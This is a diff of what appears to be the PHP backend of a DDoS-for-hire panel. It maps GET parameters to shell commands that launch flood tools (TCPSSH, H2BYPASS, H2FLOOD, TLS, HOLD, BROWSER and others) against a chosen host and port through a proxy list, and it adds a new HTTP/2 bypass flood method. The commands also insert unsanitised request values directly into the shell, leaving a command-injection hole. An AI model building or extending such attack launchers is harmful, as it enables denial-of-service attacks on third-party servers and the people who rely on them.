@@ -30,8 +30,11 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
         case 'TCPSSH':
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
+        case 'H2BYPASS':
+            $command = "cd /var/www/html/test/ && screen -dm node bypass $host $time 8 2 proxy.txt";
+            break;
         case 'H2FLOOD':
-            $command = "cd /var/www/html/test/ && screen -dm node -r bytenode loki.jsc $host $time 8 2 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node blast $host $time 8 2 proxy.txt";
             break;
         case 'TCP':
             $command = "cd /var/www/html/test/ && screen -dm ./tcppps $host $port 2 $time";
@@ -52,7 +55,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node TLS $host $time 8 2 proxy.txt";
             break;
         case 'HOLD':
-            $command = "cd /var/www/html/test/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 2 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node hold $host $time 8 2 proxy.txt";
             break;
         case 'BROWSER':
             $command = "cd /var/www/html/test/ && screen -dm node brow $host $time";
